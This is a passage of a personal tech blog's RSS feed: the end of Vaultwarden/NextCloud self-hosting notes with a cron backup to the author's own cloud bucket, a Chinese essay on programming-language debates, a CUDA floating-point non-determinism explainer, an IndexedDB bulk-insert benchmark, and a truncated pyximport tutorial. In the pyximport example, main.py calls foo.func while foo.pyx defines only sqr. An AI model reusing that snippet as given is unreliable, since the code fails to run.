class="line">    <span class="hljs-number">0</span> =&gt; <span class="hljs-string">&#x27;nc.hsfzxjy.site&#x27;</span>,</span><br><span class="line">  ),</span><br><span class="line"></span><br><span class="line">);</span><br></pre></div></div><p  class="par"> The snippet is necessary, since otherwise the clients will stuck on “Grant Access”. See <a href="https://help.nextcloud.com/t/macos-and-ios-clients-stuck-in-grant-access-loop/52279/3">this thread</a> for a full discussion.</p><h2 id="install-bookmarks-app-on-nextcloud">Install Bookmarks App on NextCloud</h2><p >Bookmarks synchronization is powered by the NextCloud app “Bookmarks”. Download it from <a href="https://apps.nextcloud.com/apps/bookmarks">here</a> and extract under <code>~/nc/data/apps/</code> to install. After which, enable the app in NextCloud settings from web interface.</p><h2 id="clients">Clients</h2><h3 id="laptop">Laptop</h3><p >Since most of my daily work is accomplished in web browsers on laptop, I choose Chrome extensions as clients. Luckily, both services provide chrome extensions, with <a href="https://chrome.google.com/webstore/detail/nngceckbapebfimnlniiiahkandclblb">Bitwarden</a> for Vaultwarden and <a href="https://chrome.google.com/webstore/detail/floccus-bookmarks-sync/fnaicdffflnofjppbagibeoednhnbjhg">floccus</a> for NextCloud Bookmarks.</p><h3 id="mobile">Mobile</h3><p >I use the apps “Bitwarden” (com.x8bit.bitwarden) and “Bookmarks” (de.emasty.bookmarks) for Android, both of which can be downloaded from Google Play Store.</p><p >For Bitwarden, turn on “Auto Filling services” in its settings to enable password auto-filling. If you are using MIUI, enable the application priviledge「后台弹出界面」to allow pop-up on clicking the drop-down box.</p><h2 id="auto-backup-service-data">Auto-Backup Service Data</h2><p >Since my VPS is hosted on Tencent Cloud, <a href="https://cloud.tencent.com/product/cos">Tencent COS</a> would be a good choice for data backup storage. The platform would not charge your network fees if VPS and COS bucket are within the same region. All you need to pay is merely the storage cost. </p><p >A back-up service can be simply set up with CRON service and a bash script:</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">sudo python3 -m pip install coscmd</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">cd</span> /home/ubuntu</span><br><span class="line">tar czvf /tmp/services.tgz nc/ vaultwarden/</span><br><span class="line">coscmd -c /home/ubuntu/tools/cosconfig upload /tmp/services.tgz services.tgz</span><br></pre></div></div><p  class="par"> Place the script at <code>/etc/cron.hourly/backup-services</code> to enable it. You would also need to create a file named <code>cosconfig</code> following <a href="https://cloud.tencent.com/document/product/436/10976#.E7.94.9F.E6.88.90.E9.85.8D.E7.BD.AE.E6.96.87.E4.BB.B6">the doc</a> for bucket configuration. Afterwards the backup service should be invoked per hour.</p><blockquote><p >Initially I’ve encountered a strange problem that CRON would not run the script. The crux is I have named it <code>backup-services.sh</code>, but CRON does not accept a file name with dot <code>.</code> inside. Check <a href="https://askubuntu.com/questions/8426/cron-hourly-wont-run/508307#508307">this answer</a> for details.</p></blockquote><h2 id="problems-remained">Problems Remained</h2><p >Password auto-filling is not available in non-Chrome browsers on Android like UC browser or MIUI’s default browser. Currently I have to copy them manually from Bitwarden app.</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/docker/">docker</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Bitwarden/">Bitwarden</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NextCloud/">NextCloud</category>
      
      
      <comments>https://i.hsfzxjy.site/rough-notes-on-deploying-vaultwarden-and-nextcloud-bookmarks/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>语言狂热者与实用主义者</title>
      <link>https://i.hsfzxjy.site/language-ethusiast-and-pragmatist/</link>
      <guid>https://i.hsfzxjy.site/language-ethusiast-and-pragmatist/</guid>
      <pubDate>Wed, 07 Jul 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;编程语言界有着一场旷日持久的争论。人们会为了一种（或一类）语言，或是自己熟用的，或是自己所欣赏的，与他人吵得不可开交。而争论的起点，可能只是某人一句小小的抱怨。各方各为其主，剑拔弩张，俨然一次声势浩大的圣战。&lt;/p&gt;
&lt;p &gt;尽管众语言不可一概而论，我们还是可以粗略地将争</description>
        
      
      
      
      <content:encoded><![CDATA[<p >编程语言界有着一场旷日持久的争论。人们会为了一种（或一类）语言，或是自己熟用的，或是自己所欣赏的，与他人吵得不可开交。而争论的起点，可能只是某人一句小小的抱怨。各方各为其主，剑拔弩张，俨然一次声势浩大的圣战。</p><p >尽管众语言不可一概而论，我们还是可以粗略地将争论的人群分为两个派别：语言狂热者与实用主义者。这是光谱的两个极端。语言狂热者关注语言本身，或是钟情于新的、现代化的语言特性，并据此评判一种语言；实用主义者则侧重于语言的工程实践，常会以语言的生态、业界使用率反驳他人。当然，也不乏两者兼具的人，对双方的意见各持有一定比例。</p><p >语言狂热者通常是学院派，多少接触过一些编程语言理论（PLT）。PLT 通常是从 $\lambda$ 演算展开论述的，因此他们也偏爱函数式编程，并希望语言有相关的概念或语法糖支持、简化函数式编程。他们会关注语言是否有完备的类型系统，是否有一等函数，是否有完备的泛型支持等。其中有一定工业背景的，还会考察是否有协程支持、零开销抽象及元编程能力等问题。从广义上看，这里面的大多数都属于语法糖。一门图灵完备的语言都可以实现以上特性，只是冗杂与否的不同罢了。语言狂热者关注语言的抽象能力，函数式编程有助于抽象高阶的逻辑，类型系统则有助于建模问题，为程序的优化与检查提供信息。这是支撑大部分狂热者行动的背后逻辑。但也不乏只注重表象者，单纯为了语法糖而语法糖，为了函数式而函数式。他们支持语法糖的理由是「酷炫」，同时会在实践中滥用函数式编程，甚至攻击其他的编程范式。</p><p >实用主义者则通常不太关心语言的特性。相反，他们会考察语言的生态、使用频度与工业部署能力。如果一门语言有强大的生态，使用人数多，或是工业部署方便，那它就是好的语言。至于语言特性，够用就行。实用主义者常常会认为语言狂热者花里胡哨，认为其所关注的问题并不能带来生产力的提升。他们认为语言能发展到如此体量，语言本身肯定是完备的，「如无必要，勿增实体」。而事实上，影响语言流行度的不止有语言本身的因素，还有社会学的因素。简单的语言通常门槛更低，可以让更多的人涌入相关行业，从而带动整个生态。但这也意味着语言能力有限，或多或少有些恼人的缺点。而其设计中的不足，或是因为创建的年代过于久远，没有现代编程语言理论的指导，或是由于历史包袱，或是由于创建者的个人品味。这些问题算不上致命，否则这些语言也不会达到如此大的体量。但它们冷不丁会出来烦扰你，让你感觉不是滋味。为此，在语言的发展过程中，其使用者会做出许多努力以弥补这些缺陷。如对于抽象能力不足的语言，使用者会总结出各种设计模式为工程解耦服务。当今所流行之设计模式，有好些就是 Java 所专有的。一个语言的设计缺陷也许在另一个语言中已经被解决了，自然也就不需要相关的设计模式。极端的实用主义者同时也是保守主义者，排斥或是抵触其他新兴语言，甚至对待本语言中的新特性也是如此。</p><p >这其中并没有哪一者是「绝对正确」的。语言狂热者的主张是美好的，但基于这些主张的语言通常有着陡峭的学习曲线，以致曲高和寡。而学习门槛的上升通常也意味着更高的人力成本。现代软件工程不只是一个技术问题，更是一个社会问题。如果两种解决方案都能达到同样的目的，资本家会选择成本更低，风险更小的一种。而实用主义者所青睐的语言有着更大的使用者基数，以及因此带来的大规模生态，这通常是资本家所需要的。语言狂热者善于从历史中发现各语言优秀的一面，并依此引导编程语言的改进。实用主义者则致力于发展生态，而其中一些建设性的东西往往是为了弥补语言的缺陷——这通常也为语言狂热者带来新的思考。二十年前几乎没有语言内置了对协程的语法支持，这是由当时硬件条件所限。而为了更有效地利用多核资源，各语言的生态中都先后出现了类似「绿色线程」的库，这也是协程的雏形。现代语言的协程语法正是脱胎于此。</p><p >但两个阵营中都有趋于封闭保守的成员，他们通常也是争论的发起者。一方是形而上「现代编程语言」的爱好者，一方则是满足于现状。他们在实践中更容易做无用功。前者会过度或盲目使用语言的特性，会将问题复杂化；而后者则会因语言抽象不足设计出繁冗的程序，即便有更简洁的解决方案。这些立场都是无益的，需要我们有所规避。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      
      <comments>https://i.hsfzxjy.site/language-ethusiast-and-pragmatist/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Demystify the randomness in CUDA kernels</title>
      <link>https://i.hsfzxjy.site/where-does-the-randomness-of-cuda-kernels-come-from/</link>
      <guid>https://i.hsfzxjy.site/where-does-the-randomness-of-cuda-kernels-come-from/</guid>
      <pubDate>Thu, 10 Jun 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;You might have heard that many CUDA operators contains some kind of non-determinism, and to eliminate the randomness, one must pay for t</description>
        
      
      
      
      <content:encoded><![CDATA[<p >You might have heard that many CUDA operators contains some kind of non-determinism, and to eliminate the randomness, one must pay for the degradation of performance. The warning occurs many times in blog posts or framework documentation, but few of them give a detailed explanation for the source of randomness. To this end, the post is going to explore the problem.</p><p >When talked about GPU computation, one might come up with a notion of some super-fast hardwares. The surprising speed comes from intensive parallelism of the architecture, which allows users to run thousands of routines on parallel (compared to dozens on ordinary CPUs). The routines are called <strong>threads</strong>, and similar to the concept with the same name in operating systems, they suffer from <strong>non-deterministic execution order</strong> and <strong>data race condition</strong>.</p><p >Non-deterministic execution order means, if we arrange all instructions of different threads into a sequence, ordered by their occurrence time, the sequence could vary greatly across invocations. If two threads run on parallel, each with a single instruction, we cannot tell which one is executed first. This is the fundamental origin of randomness, and is inevitable.</p><p >Data race condition is one of the consequences of non-deterministic execution order. When the threads is manipulating some shared variables, and the manipulation is not <em>atomic</em>, i.e. consists of interruptible instruction sequence, the program might yield undesired results. Programs should be carefully designed to avoid race condition, with the help of locks or atomic operations. To alleviate, CUDA provides atomic arithmetic routines like <code>atomicAdd()</code> or <code>atomicMax()</code> for safe access to shared memory.</p><p >By far we have seen that there does exist some kind of randomness inside GPUs, and if not handled properly, our program will give incorrect results when working with shared variables. But one may argue that, we have atomic operations like <code>atomicAdd()</code>. If a program correctly sums up the same collection of numbers, although the order might be messed, it should always returns the same result. Sadly this is wrong, since some arithmetic operations <strong>DOES rely on the order of operands</strong>! Let’s take the following CUDA program as an example:</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-type">float</span> *result)</span> </span>{</span><br><span class="line">    <span class="hljs-type">float</span> i = (<span class="hljs-type">float</span>)blockIdx.x;</span><br><span class="line">    <span class="hljs-built_in">atomicAdd</span>(result, i / <span class="hljs-number">10</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-type">float</span> *cu_result;</span><br><span class="line">    <span class="hljs-built_in">cudaMalloc</span>(&amp;cu_result, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>));</span><br><span class="line">    <span class="hljs-type">float</span> result;</span><br><span class="line">    <span class="hljs-type">int</span>   i;</span><br><span class="line">    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {</span><br><span class="line">        <span class="hljs-built_in">cudaMemset</span>(cu_result, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>));</span><br><span class="line">        sum&lt;&lt;&lt;N, <span class="hljs-number">1</span>&gt;&gt;&gt;(cu_result);</span><br><span class="line">        <span class="hljs-built_in">cudaMemcpy</span>(&amp;result, cu_result, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>), cudaMemcpyDeviceToHost);</span><br><span class="line">        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%f\n&quot;</span>, result);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">cudaFree</span>(cu_result);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> In this simple program, we implement a parallelized summing function with <code>atomicAdd()</code>. We sum up $\{0.0,0.1,0.2,\ldots,99.8,99.9\}$ for 10 times and print out the results. The results would look like:</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">49949.996094</span><br><span class="line">49950.003906</span><br><span class="line">49950.000000</span><br><span class="line">49950.000000</span><br><span class="line">49949.996094</span><br><span class="line">49950.000000</span><br><span class="line">49949.988281</span><br><span class="line">49949.992188</span><br><span class="line">49949.996094</span><br><span class="line">49950.000000</span><br></pre></div></div><p  class="par"> which is completely non-deterministic with some random small errors (the accurate answer should be 49950).</p><p >The key is that, <strong>floating-point arithemtics are non-associative</strong>. The equation $(a + b) + c = a + (b + c)$ does NOT hold for floating-point numbers $a, b, c$.</p><p >To understand this, let’s consider an extreme example – a very simple decimal floating-point representation with no fraction digits, i.e., numbers are represented as $\pm b \times 10^{e}$, where $b \in \{0 \ldots 9\}$. We will calculate $(0.8+1.5)-1.6$ and $0.8+(1.5-1.6)$ under this kind of “specification”. Below are their representation:</p><p >$$\begin{aligned}0.8 &amp;\rightarrow 8 \times 10^{-1} \\1.5 &amp;\rightarrow 2 \times 10^{0}  \\1.6 &amp;\rightarrow 2 \times 10^{0} \\\end{aligned}$$</p><p  class="nomargin"> For $(0.8 + 1.5)-1.6$, we first shift the base of $8 \times 10^{-1}$ by 1 digit and get $0.8 \times 10^{0}$. Due to an underflow, it is truncated and becomes $0 \times 10^{0}$. Then sum up $0 \times 10^{0}$ (0.8) and $2 \times 10^{0}$ (1.5) and get $2 \times 10^{0}$. Further $2 \times 10^{0} - 2 \times 10^{0}$ (1.6), results in $0 \times 10^{0}$.</p><p  class="nomargin"> For $0.8 + (1.5-1.6)$, first calculate $2 \times 10^0$ (1.5) $-2 \times 10^0$ (1.6) and get $0 \times 10^{0}$. Then $8 \times 10^{-1}$ (0.8) adding with $0 \times 10^0$, results in $8 \times 10^{-1}$.</p><p >The example showcases a situation that floating-point underflow during summation could lead to extra numeric error, and further causes non-associativity in the arithemtic. It is simple, but can be generalized to the current IEEE 754 floating-point numbers. <em>The operands’ order matters in floating-point arithemtics!</em></p><p >So here’s the answer. When running parallelized routines, GPUs have some innate randomness which comes from non-deterministic execution order. If a program consists of order-dependent operations, it will give non-deterministic output. Floating-point arithemtics, used widely in CUDA algorithms, are also such kind of operations, though less known by people. Atomic arithemtics solve the race condition problem, but do not guarantee the order.</p><p >If one requires determinism, the program should sequentialize the operations by using single thread or special synchronization, which will lead to a performance degrade. There is always a trade-off between determinism and performance.</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/CUDA/">CUDA</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Determinism/">Determinism</category>
      
      
      <comments>https://i.hsfzxjy.site/where-does-the-randomness-of-cuda-kernels-come-from/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Performant Bulk Mutations in IndexedDB</title>
      <link>https://i.hsfzxjy.site/indexeddb-performant-bulk-mutations/</link>
      <guid>https://i.hsfzxjy.site/indexeddb-performant-bulk-mutations/</guid>
      <pubDate>Sat, 29 May 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;IndexedDB seems to be inefficient when working on bulk mutations, such as dumping a huge list of items into an object store – at least I</description>
        
      
      
      
      <content:encoded><![CDATA[<p >IndexedDB seems to be inefficient when working on bulk mutations, such as dumping a huge list of items into an object store – at least I think so at the first sight on the MDN docs. It provides no explicit API for the job as SQL does <sup id="fnref:1"><a href="#fn:1">1</a></sup>, so all we can do is to loop from client side, which cannot benefit from database internal optimization (if there’s any). The mutation requests, in addition, appear to be spawned sequentially – the tutorial recommends a paradigm to raise a request within the <code>success</code> event callback of the previous request, which is in fact a sequential execution. Such code will be definitely slow.</p><p >We may conduct a quick benchmark on the above approach:</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">;(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">    <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">const</span> r = indexedDB.<span class="hljs-title function_">deleteDatabase</span>(<span class="hljs-string">&quot;test&quot;</span>)</span><br><span class="line">        r.<span class="hljs-property">onsuccess</span> = r.<span class="hljs-property">onerror</span> = resolve</span><br><span class="line">    })</span><br><span class="line">    <span class="hljs-keyword">const</span> items = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">100000</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> ({ <span class="hljs-attr">id</span>: i }))</span><br><span class="line">    <span class="hljs-keyword">const</span> store = <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {</span><br><span class="line">        indexedDB.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">1</span>).<span class="hljs-property">onupgradeneeded</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {</span><br><span class="line">            <span class="hljs-keyword">const</span> db = event.<span class="hljs-property">target</span>.<span class="hljs-property">result</span></span><br><span class="line">            <span class="hljs-keyword">const</span> store = db.<span class="hljs-title function_">createObjectStore</span>(<span class="hljs-string">&quot;store&quot;</span>, { <span class="hljs-attr">keyPath</span>: <span class="hljs-string">&quot;id&quot;</span> })</span><br><span class="line">            store.<span class="hljs-title function_">createIndex</span>(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)</span><br><span class="line">            <span class="hljs-title function_">resolve</span>(store)</span><br><span class="line">        }</span><br><span class="line">    })</span><br><span class="line">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&quot;bulkAdd&quot;</span>)</span><br><span class="line">    <span class="hljs-keyword">await</span> <span class="hljs-title function_">bulkAdd</span>(store, items)</span><br><span class="line">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&quot;bulkAdd&quot;</span>)</span><br><span class="line">})()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">function</span> <span class="hljs-title function_">bulkAdd</span>(<span class="hljs-params">store, items</span>) {</span><br><span class="line">    <span class="hljs-keyword">const</span> failures = []</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">function</span> <span class="hljs-title function_">_perform</span>(<span class="hljs-params">idx</span>) {</span><br><span class="line">            <span class="hljs-keyword">const</span> req = store.<span class="hljs-title function_">add</span>(items[idx])</span><br><span class="line">            req.<span class="hljs-property">onsuccess</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {</span><br><span class="line">                <span class="hljs-keyword">if</span> (idx === items.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) <span class="hljs-title function_">resolve</span>(failures)</span><br><span class="line">                <span class="hljs-keyword">else</span> <span class="hljs-title function_">_perform</span>(idx + <span class="hljs-number">1</span>)</span><br><span class="line">            }</span><br><span class="line">            req.<span class="hljs-property">onerror</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {</span><br><span class="line">                failures.<span class="hljs-title function_">push</span>(items[idx].<span class="hljs-property">id</span>)</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-title function_">_perform</span>(<span class="hljs-number">0</span>)</span><br><span class="line">    })</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> Practically, we concern more about failed records than the ones inserted successfully. We thus take down only the indices of those records, which improves the efficiency at least a little bit.</p><p >The timing is rather unstable, but on average, it takes 30~40 seconds to insert 100k records or 2000~3000 records per second, which is not promising.</p><p >So why should the requests be aranged like this? I found a statement in the <a href="https://developer.mozilla.org/en-US/docs/Web/API/IDBTransaction/commit">MDN docs</a>:</p><blockquote><p  class="noindent"> Note that <code>commit()</code> doesn’t normally have to be called — a transaction will automatically commit when all outstanding requests have been satisfied and no new requests have been made. <code>commit()</code> can be used to start the commit process without waiting for events from outstanding requests to be dispatched.</p></blockquote><p  class="par"> Unlike many other databases, IndexedDB transaction implicitly commits changes, at the instant when <em>all callbacks of previous requests are invoked (and returned), and there’s no more new requests</em>. Hence a later request must be queued before the previous one completed or at the time of its <code>success</code> or <code>error</code> callbacks executing, otherwise the transaction will be closed. Raising new requests in callbacks is safe, but not very efficient.</p><p >Can we make it better? Absolutely. We can perform the mutations “concurrently”, that is, raising all requests at a time.</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">function</span> <span class="hljs-title function_">bulkAdd</span>(<span class="hljs-params">store, items</span>) {</span><br><span class="line">    <span class="hljs-keyword">const</span> failures = []</span><br><span class="line">    <span class="hljs-keyword">const</span> promises = []</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> items) {</span><br><span class="line">        <span class="hljs-keyword">const</span> req = store.<span class="hljs-title function_">add</span>(item)</span><br><span class="line">        promises.<span class="hljs-title function_">push</span>(</span><br><span class="line">            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {</span><br><span class="line">                req.<span class="hljs-property">onsuccess</span> = resolve</span><br><span class="line">                req.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> {</span><br><span class="line">                    failures.<span class="hljs-title function_">push</span>(item.<span class="hljs-property">id</span>)</span><br><span class="line">                    <span class="hljs-title function_">resolve</span>()</span><br><span class="line">                }</span><br><span class="line">            })</span><br><span class="line">        )</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(promises).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> failures)</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> The execution time is ~15 seconds now, around 2x faster than the first implementation.</p><p >But wait … is this implementation reliable? Is it possible that at some point all previous requests are completed, but there’s still new requests to be raised? The answer is yes, but the transaction won’t be closed for this, since <em>the callbacks have not yet been invoked</em>.</p><p >Recall that Javascript has a single-threaded execution model. All callbacks reside in a queue and are executed sequentially when the thread is idle. The mechanism ensures that mutation request callbacks won’t be executed before all requests raised, as the raising operations and callbacks are executed in the same thread. So even if some requests complete early, their <code>success</code> or <code>error</code> callbacks will still be scheduled after all requests are created. The implementation is definitely reliable.</p><p >Now we have reached a speed of ~6000 records per second. Can we make it even better? Of course yes!</p><p >If you read the code carefully, you may notice that <code>req.onsuccess</code> is doing something vain. A <code>resolve</code> function is passed as <code>success</code> callback, just to inform the timing of request completion. However, we are not interested about the timing of each request completion. Instead, only the timing of last completion is important.</p><p >We may expect the callbacks be executed in the order they are raised. They do actually. But weirdly, the MDN docs does not advertise such point, and we have to dive into the <a href="https://www.w3.org/TR/IndexedDB-3/">IndexedDB Specification</a> to seek the clues. After struggling against the verbose documentation, I catch something at section <a href="https://www.w3.org/TR/IndexedDB-3/#async-execute-request">Asynchronously executing a request</a>. Briefly speaking,</p><ul><li>A request won’t be processed before previous requests’ <code>processed</code> flags be set. <sup id="fnref:2"><a href="#fn:2">2</a></sup></li><li>A request will immediately queue a task after its <code>processed</code> flag set, within which the callbacks are invoked. <sup id="fnref:3"><a href="#fn:3">3</a></sup></li></ul><p  class="par"> which means, the tasks firing events will be ordered as their corresponding requests. Consequently, we might be able to know the timing of all completions, by only listening to the <code>success</code>/<code>error</code> events of the last request:</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">function</span> <span class="hljs-title function_">bulkAdd</span>(<span class="hljs-params">store, items</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">const</span> failures = []</span><br><span class="line">        <span class="hljs-keyword">let</span> req, item</span><br><span class="line">        <span class="hljs-keyword">for</span> (item <span class="hljs-keyword">of</span> items) {</span><br><span class="line">            req = store.<span class="hljs-title function_">add</span>(item)</span><br><span class="line">            req.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> failures.<span class="hljs-title function_">push</span>(item.<span class="hljs-property">id</span>)</span><br><span class="line">        }</span><br><span class="line">        req.<span class="hljs-property">onsuccess</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(failures)</span><br><span class="line">        req.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> {</span><br><span class="line">            failures.<span class="hljs-title function_">push</span>(item.<span class="hljs-property">id</span>)</span><br><span class="line">            <span class="hljs-title function_">resolve</span>(failures)</span><br><span class="line">        }</span><br><span class="line">    })</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> This time we have a better running time of 10~12 seconds, which is 8000~10000 records per second, nearly 4x faster than the first implementation! The table below summarizes how the performance get improved along the way:</p><table><thead><tr><th>impl.</th><th>time(s)</th><th>speed(r/s)</th></tr></thead><tbody><tr><td>sequential</td><td>30~40</td><td>2000~3000</td></tr><tr><td>concurrent</td><td>~15</td><td>~6000</td></tr><tr><td>concurrent+less listeners</td><td>10~12</td><td>8000~10000</td></tr></tbody></table><p >The last implementation is also how <a href="https://dexie.org/">Dexie.js</a> does for efficient bulk mutations. The library makes a statement on its homepage:</p><blockquote><p  class="par"> Its bulk operations utilize an often-overlooked feature in IndexedDB, ignoring success callbacks when possible.</p></blockquote><h2 id="references-6">References</h2><ul><li><a href="https://www.w3.org/TR/IndexedDB-3/#async-execute-request">Indexed Database API 3.0 - 5.6: Asynchronously executing a request</a></li><li><a href="https://github.com/dfahlander/Dexie.js/blob/76ab6ac4bd/src/dbcore/dbcore-indexeddb.ts#L118">Dexie.js/src/dbcore/dbcore-indexeddb.ts Line 118</a></li><li><a href="https://stackoverflow.com/a/52555073/3278171">StackOverflow - Optimized Bulk (Chunk) Upload Of Objects Into IndexedDB</a></li></ul><div class="footnotes"><ol><li class="footnote" id="fn:1">you may add as many records after the <code>INSERT INTO ... VALUES</code> clause</li><li class="footnote" id="fn:2">See <em>5.6.5.1 Wait until request is the first item in transaction’s request list that is not processed.</em></li><li class="footnote" id="fn:3">See <em>5.6.5.6: Queue a task to run these steps</em></li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Web/">Web</category>
      
      <category domain="https://i.hsfzxjy.site/tags/IndexedDB/">IndexedDB</category>
      
      
      <comments>https://i.hsfzxjy.site/indexeddb-performant-bulk-mutations/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Auto Rebuild .pyx Files with pyximport</title>
      <link>https://i.hsfzxjy.site/cython-auto-reload/</link>
      <guid>https://i.hsfzxjy.site/cython-auto-reload/</guid>
      <pubDate>Sat, 15 May 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Modules written in Cython usually comes with a &lt;code&gt;setup.py&lt;/code&gt; script that compiles Cython source codes into native shared libary.</description>
        
      
      
      
      <content:encoded><![CDATA[<p >Modules written in Cython usually comes with a <code>setup.py</code> script that compiles Cython source codes into native shared libary. For whom not so familiar with Python’s packaging and distributing toolchains, such step is sometimes scary, and turns out to be a stumbling block for Cython freshmen. Moreover, the workflow, “run setup.py -&gt; debug -&gt; edit .pyx files -&gt; run setup.py”, is also less convenient and troublesome for fast iterating projects.</p><p ><code>pyximport</code> is a handy tool from Cython official, provided to address the above problem. The module enables users to “directly import” <code>.pyx</code> files, with no explicit <code>setup.py</code> required. Let’s start from an example here. Say we have two files residing in the same directory:</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># main.py</span></span><br><span class="line"><span class="hljs-keyword">import</span> pyximport</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># hl: begin</span></span><br><span class="line">pyximport.install(language_level=<span class="hljs-number">3</span>)</span><br><span class="line"><span class="hljs-comment"># hl: end</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> foo</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(foo.func(<span class="hljs-number">3</span>))</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># foo.pyx</span></span><br><span class="line">cpdef <span class="hljs-built_in">int</span> sqr(<span class="hljs-built_in">int</span> x):</span><br><span class="line">    <span class="hljs-keyword">return</span> x * x</span><br></pre></div></div><p  class="par"> The magical <code class="_hl-label">highlighted</code> line registers some import hooks to let Python recognize <code>.pyx</code> files. When the <code>.pyx</code> files imported for the first time or modified later, <code>pyximport</code> compiles or re-compiles them 